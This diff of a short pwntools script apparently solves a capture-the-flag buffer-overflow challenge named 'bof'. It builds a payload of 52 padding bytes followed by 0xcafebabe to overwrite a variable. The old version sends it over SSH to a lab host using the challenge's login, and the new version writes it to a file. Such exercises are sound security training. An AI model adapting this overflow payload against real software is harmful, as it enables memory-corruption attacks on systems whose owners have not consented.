@@ -1,16 +1,16 @@
-#!/usr/bin/env python
+from os import write
+import pwn
 
-from pwn import context, gdb, p32, process, ssh
+offset = 'A' * 52 
+pwn.context.endian = 'little'
+payload = pwn.p32(0xcafebabe)
 
-ssh = ssh(user='bof', port=2222, password='guest')
-p = ssh.system('./bof')
+f = open('payload', 'wb')
+f.write(offset.encode())
+f.write(payload)
+f.close()
 
-#buffer is 52 bytes away from the varaible
-padding = ('A' * 52).encode()
-payload = p32(0xcafebabe, endianness='little')
 
-fullpl = padding + payload
 
-#p = process('./bof')
-p.sendline(fullpl)
-print(p.recvall())
+
+
